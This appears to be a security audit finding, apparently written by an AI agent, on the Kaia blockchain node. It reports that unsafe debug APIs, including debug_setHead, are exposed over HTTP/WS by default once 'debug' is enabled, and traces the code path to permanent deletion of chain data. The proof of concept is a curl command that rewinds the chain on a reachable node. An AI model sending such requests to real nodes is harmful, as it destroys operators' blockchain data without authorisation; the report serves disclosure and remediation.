Now I have enough context to write the finding. Let me verify the exact `SetHead` backend call path.

### Title
`DisableUnsafeDebug` Defaults to `false`, Exposing `debug_setHead` Over HTTP/WS and Enabling Unauthenticated Chain-State Rewind — (File: `node/cn/backend.go`, `api/api_debug_util.go`, `blockchain/blockchain.go`)

---

### Summary

When an operator adds `"debug"` to the node's HTTP or WebSocket module list (a routine debugging practice), the `DisableUnsafeDebug` configuration flag defaulting to `false` causes `debug_setHead` — and the full `DebugUtilAPI`, `tracers.UnsafeAPI`, `DebugStorageCNAPI`, and `debug.Handler` — to be registered on the public HTTP/WS endpoint without any authentication. Any unauthenticated caller who can reach that endpoint can invoke `debug_setHead(N)` to rewind the canonical chain head, permanently deleting block bodies, receipts, governance votes, Istanbul validator-set snapshots, and staking-info records for every block above `N`.

---

### Finding Description

**Invariant classification (analog to external bug):**
The external bug is a "configuration flag set for one purpose inadvertently enables a dangerous privileged capability." In Kaia the exact analog is: adding `"debug"` to HTTP/WS modules (for legitimate tracing) inadvertently exposes chain-rewind authority because `DisableUnsafeDebug` defaults to `false`.

**Step 1 — Default value of `DisableUnsafeDebug`.**

`node/config.go` declares the field with no initializer:

```go
// Disable option for unsafe debug APIs
DisableUnsafeDebug bool `toml:",omitempty"`
```

Go zero-initialises `bool` to `false`, so `DisableUnsafeDebug` is `false` unless the operator explicitly passes `--rpc.unsafe-debug.disable`. [1](#0-0) 

**Step 2 — `IPCOnly` is wired directly to `DisableUnsafeDebug`.**

In `node/cn/backend.go` the `DebugUtilAPI` (which owns `debug_setHead`), `tracers.UnsafeAPI`, `DebugStorageCNAPI`, and in `node/node.go` the `debug.Handler` are all registered with `IPCOnly: s.config.DisableUnsafeDebug` / `IPCOnly: n.config.DisableUnsafeDebug`:

```go
{
    Namespace: "debug",
    Service:   api.NewDebugUtilAPI(s.APIBackend),
    Public:    false,
    IPCOnly:   s.config.DisableUnsafeDebug,   // false by default
},
...
{
    Namespace: "debug",
    Service:   tracers.NewUnsafeAPI(s.APIBackend),
    Public:    false,
    IPCOnly:   s.config.DisableUnsafeDebug,   // false by default
},
``` [2](#0-1) [3](#0-2) [4](#0-3) 

**Step 3 — HTTP/WS endpoint registration logic.**

`StartHTTPEndpoint` registers every API whose namespace is in the operator-supplied whitelist, subject only to `!api.IPCOnly`:

```go
if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
    handler.RegisterName(api.Namespace, api.Service)
}
``` [5](#0-4) 

When `DisableUnsafeDebug` is `false`, `IPCOnly` is `false`, so the condition reduces to `whitelist["debug"]`. If the operator has added `"debug"` to `HTTPModules` or `WSModules`, every unsafe debug method — including `debug_setHead` — is reachable over the network with no authentication.

**Step 4 — `debug_setHead` has no authentication guard.**

```go
func (api *DebugUtilAPI) SetHead(number rpc.BlockNumber) error {
    if number == rpc.PendingBlockNumber ||
        number == rpc.LatestBlockNumber ||
        number.Uint64() > api.b.CurrentBlock().NumberU64() {
        return errors.New("Cannot rewind to future")
    }
    return api.b.SetHead(uint64(number))
}
``` [6](#0-5) 

**Step 5 — `CNAPIBackend.SetHead` cancels the downloader and calls `bc.SetHead`.**

```go
func (b *CNAPIBackend) SetHead(number uint64) error {
    b.cn.protocolManager.Downloader().Cancel()
    b.cn.protocolManager.SetSyncStop(true)
    defer b.cn.protocolManager.SetSyncStop(false)
    return doSetHead(b.cn.blockchain, b.cn.engine, b.gpo, number)
}
``` [7](#0-6) 

**Step 6 — `bc.SetHead` / `setHeadBeyondRoot` permanently deletes protected state.**

The `delFn` callback executed for every block above the target:

```go
bc.db.DeleteBody(hash, num)
bc.db.DeleteReceipts(hash, num)
bc.db.DeleteGovernance(num)
if params.IsCheckpointInterval(num) {
    bc.db.DeleteIstanbulSnapshot(hash)
}
for _, module := range bc.rewindableModules {
    module.RewindDelete(hash, num)   // staking, governance, etc.
}
``` [8](#0-7) 

Additionally, Istanbul snapshots for the current epoch are deleted: [9](#0-8) 

The canonical head pointer is overwritten:

```go
bc.db.WriteHeadBlockHash(newHeadBlock.Hash())
bc.currentBlock.Store(newHeadBlock)
``` [10](#0-9) 

---

### Impact Explanation

A single unauthenticated HTTP POST to a node whose operator has added `"debug"` to the module list:

```
POST / HTTP/1.1
{"jsonrpc":"2.0","method":"debug_setHead","params":["0x1"],"id":1}
```

causes:
- **Canonical chain head** rewound to block 1; all subsequent blocks' bodies and receipts deleted from LevelDB/PebbleDB.
- **Governance votes and parameter changes** (`DeleteGovernance`) erased for every deleted block, corrupting the governance parameter set seen by all future blocks.
- **Istanbul validator-set snapshots** (`DeleteIstanbulSnapshot`) erased, breaking the BFT consensus engine's ability to reconstruct the validator committee for past epochs.
- **Staking-info records** (`module.RewindDelete`) erased, corrupting reward distribution and validator-set derivation.
- **Downloader cancelled** and sync paused, preventing the node from recovering automatically.

These are all persistent on-disk deletions. The node cannot re-derive the deleted data without a full resync from genesis or a trusted peer.

---

### Likelihood Explanation

- Many node operators add `"debug"` to HTTP/WS modules to use `debug_traceTransaction` or `debug_dumpBlock` for operational monitoring or DApp development.
- `DisableUnsafeDebug` is an opt-in flag with a non-obvious name; operators who enable the `"debug"` namespace are not warned that they are also enabling `debug_setHead`.
- Public endpoint nodes (ENs serving DApps) are the most exposed; a single attacker who discovers the endpoint can execute the rewind.

---

### Recommendation

1. **Invert the default**: Change `DisableUnsafeDebug` to `true` by default in `node/defaults.go` so that unsafe debug APIs are IPC-only unless the operator explicitly opts in.
2. **Separate namespaces**: Register `DebugUtilAPI` (containing `debug_setHead`) and `tracers.UnsafeAPI` under a distinct namespace (e.g., `"debug_unsafe"`) so that adding `"debug"` to HTTP modules does not automatically expose chain-rewind authority.
3. **Add a startup warning**: Log a prominent warning when `"debug"` is in `HTTPModules` or `WSModules` and `DisableUnsafeDebug` is `false`.

---

### Proof of Concept

**Preconditions:**
- Node started with `--rpc --rpcapi "kaia,debug"` (or equivalent YAML config) and `--rpc.unsafe-debug.disable` not set (default).
- Attacker has HTTP access to the node's RPC port (e.g., port 8551).

**Attack:**
```bash
# Rewind the chain to block 1, deleting all governance/staking/receipt data above it
curl -X POST http://<node-ip>:8551 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_setHead","params":["0x1"],"id":1}'
# Expected response: {"jsonrpc":"2.0","id":1,"result":null}
```

**Verification:**
```bash
# Chain head is now block 1
curl -X POST http://<node-ip>:8551 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"kaia_blockNumber","params":[],"id":1}'
# Returns: {"result":"0x1",...}
```

All block bodies, receipts, governance records, Istanbul snapshots, and staking-info entries for blocks 2 through the former head are permanently deleted from the node's database. The node will attempt to resync from peers but the deleted on-disk data is unrecoverable without a full resync.

### Citations

**File:** node/config.go (L189-190)
```go
	// Disable option for unsafe debug APIs
	DisableUnsafeDebug bool `toml:",omitempty"`
```

**File:** node/cn/backend.go (L735-741)
```go
		}, {
			Namespace: "debug",
			Version:   "1.0",
			Service:   api.NewDebugUtilAPI(s.APIBackend),
			Public:    false,
			IPCOnly:   s.config.DisableUnsafeDebug,
		},
```

**File:** node/cn/backend.go (L806-812)
```go
		}, {
			Namespace: "debug",
			Version:   "1.0",
			Service:   tracers.NewUnsafeAPI(s.APIBackend),
			Public:    false,
			IPCOnly:   s.config.DisableUnsafeDebug,
		}, {
```

**File:** node/node.go (L750-754)
```go
			Namespace: "debug",
			Version:   "1.0",
			Service:   debug.Handler,
			IPCOnly:   n.config.DisableUnsafeDebug,
		},
```

**File:** networks/rpc/endpoints.go (L47-52)
```go
		if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
			if err := handler.RegisterName(api.Namespace, api.Service); err != nil {
				return nil, nil, err
			}
			logger.Debug("HTTP registered", "namespace", api.Namespace)
		}
```

**File:** api/api_debug_util.go (L100-108)
```go
// SetHead rewinds the head of the blockchain to a previous block.
func (api *DebugUtilAPI) SetHead(number rpc.BlockNumber) error {
	if number == rpc.PendingBlockNumber ||
		number == rpc.LatestBlockNumber ||
		number.Uint64() > api.b.CurrentBlock().NumberU64() {
		return errors.New("Cannot rewind to future")
	}
	return api.b.SetHead(uint64(number))
}
```

**File:** node/cn/api_backend.go (L100-104)
```go
func (b *CNAPIBackend) SetHead(number uint64) error {
	b.cn.protocolManager.Downloader().Cancel()
	b.cn.protocolManager.SetSyncStop(true)
	defer b.cn.protocolManager.SetSyncStop(false)
	return doSetHead(b.cn.blockchain, b.cn.engine, b.gpo, number)
```

**File:** blockchain/blockchain.go (L596-603)
```go
			bc.db.WriteHeadBlockHash(newHeadBlock.Hash())

			// Degrade the chain markers if they are explicitly reverted.
			// In theory we should update all in-memory markers in the
			// last step, however the direction of SetHead is from high
			// to low, so it's safe the update in-memory markers directly.
			bc.currentBlock.Store(newHeadBlock)
			headBlockNumberGauge.Update(int64(newHeadBlock.NumberU64()))
```

**File:** blockchain/blockchain.go (L630-644)
```go
	delFn := func(hash common.Hash, num uint64) {
		// Remove relative body, receipts, header-governance database,
		// istanbul snapshot database, and staking info database from the active store.
		// The header, total difficulty and canonical hash will be
		// removed in the hc.SetHead function.
		bc.db.DeleteBody(hash, num)
		bc.db.DeleteReceipts(hash, num)
		bc.db.DeleteGovernance(num)
		if params.IsCheckpointInterval(num) {
			bc.db.DeleteIstanbulSnapshot(hash)
		}

		for _, module := range bc.rewindableModules {
			module.RewindDelete(hash, num)
		}
```

**File:** blockchain/blockchain.go (L670-689)
```go
		// Delete istanbul snapshot database further two epochs
		// Invoked only if the sethead was originated from explicit API call
		var (
			curBlkNum   = bc.CurrentBlock().Number().Uint64()
			epoch       = bc.Config().Istanbul.Epoch
			votingEpoch = curBlkNum - (curBlkNum % epoch)
		)
		if votingEpoch == 0 {
			votingEpoch = 1
		}
		// Delete the snapshot state beyond the block number of the previous epoch on the right
		for i := curBlkNum; i >= votingEpoch; i-- {
			if params.IsCheckpointInterval(i) {
				// delete from sethead number to previous two epoch block nums
				// to handle a block that contains non-empty vote data to make sure
				// the `HandleGovernanceVote()` cannot be skipped
				bc.db.DeleteIstanbulSnapshot(bc.GetBlockByNumber(i).Hash())
			}
		}
		logger.Trace("[SetHead] Snapshot database deleted", "from", originLatestBlkNum, "to", votingEpoch)
```
